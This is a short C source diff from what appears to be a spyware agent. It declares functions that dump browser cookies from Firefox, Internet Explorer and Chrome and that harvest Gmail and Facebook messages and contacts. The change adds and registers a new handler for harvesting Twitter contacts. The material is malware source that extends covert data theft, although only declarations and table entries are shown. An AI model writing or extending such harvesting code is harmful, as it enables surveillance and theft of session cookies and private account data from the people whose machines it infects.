@@ -19,6 +19,7 @@
 extern DWORD HandleGMail(char *); // Handler per GMail
 extern DWORD HandleFBMessages(char *); // Handler per FaceBook
 extern DWORD HandleFBContacts(char *); // Handler per FaceBook
+extern DWORD HandleTwitterContacts(char *); // Handler per Twitter
 extern int DumpFFCookies(void); // Cookie per Facebook
 extern int DumpIECookies(void); // Cookie per IExplorer
 extern int DumpCHCookies(void); // Cookie per Chrome
@@ -199,7 +200,8 @@ void InitSocialEntries()
 	social_entry[1].RequestHandler = HandleGMail;
 	wcscpy_s(social_entry[2].domain, FACEBOOK_DOMAIN);
 	social_entry[2].RequestHandler = HandleFBContacts;
-
+	wcscpy_s(social_entry[3].domain, TWITTER_DOMAIN);
+	social_entry[3].RequestHandler = HandleTwitterContacts;
 }
 
 void SocialMainLoop()
